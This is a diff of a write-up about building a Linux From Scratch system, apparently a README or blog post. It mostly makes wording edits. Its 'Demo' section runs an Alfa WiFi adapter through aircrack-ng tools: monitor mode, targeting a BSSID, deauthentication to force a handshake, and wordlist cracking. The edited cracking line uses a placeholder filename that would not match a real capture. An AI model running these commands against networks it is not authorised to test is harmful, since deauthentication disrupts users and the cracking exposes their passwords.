@@ -85,7 +85,7 @@ readelf -l a.out | grep ld-linux
 
 ### Entering chroot and building the real system
 
-Once the temporary toolchain was done I mounted the virtual filesystems and entered a chroot environment — stepping inside the half-built LFS system.
+Once the temporary toolchain was done I mounted the virtual filesystems and entered a chroot environment, stepping inside the half-built LFS system.
 
 ```bash
 sudo mount -v --bind /dev $LFS/dev
@@ -238,14 +238,11 @@ make -j4 && make install
 
 ### The WiFi adapter
 
-I used an Alfa AWUS036ACH with a Realtek RTL8812AU chipset. The key thing about this adapter is that its driver (`rtw88_8812au`) was merged into the mainline Linux kernel in version 6.14 — so on my kernel 6.16.1 it works without any external driver installation. Before 6.14 you had to use an out-of-kernel driver which was a mess to maintain.
+I used an Alfa AWUS036ACH with a Realtek RTL8812AU chipset. The key thing about this adapter is that its driver (`rtw88_8812au`) was merged into the mainline Linux kernel in version 6.14, so on my kernel 6.16.1 it works without any external driver installation. Before 6.14 you had to use an out-of-kernel driver which was a mess to maintain.
 
 ### Demo
 
 ```bash
-# Load the WiFi driver
-modprobe rtw88_8812au
-
 # Check the adapter shows up
 airmon-ng
 # phy1  wlan0  rtw88_8812au  Realtek Semiconductor Corp.
@@ -257,16 +254,14 @@ airmon-ng start wlan0
 airodump-ng wlan0
 
 # Target a network on channel 6
-mount -o remount,rw /
-mkdir -p /tmp/capture
 airodump-ng -c 6 --bssid [BSSID] -w /tmp/capture/capture wlan0
 
 # Force a handshake with deauth
 aireplay-ng -0 3 -a [BSSID] wlan0
 
 # Crack it
-aircrack-ng -w wordlist.txt /tmp/capture/capture-01.cap
-# KEY FOUND! [ 12345 ]
+aircrack-ng -w rockyou.txt /tmp/capture/capture-#.cap
+# KEY FOUND! [ ***** ]
 ```
 
 ---
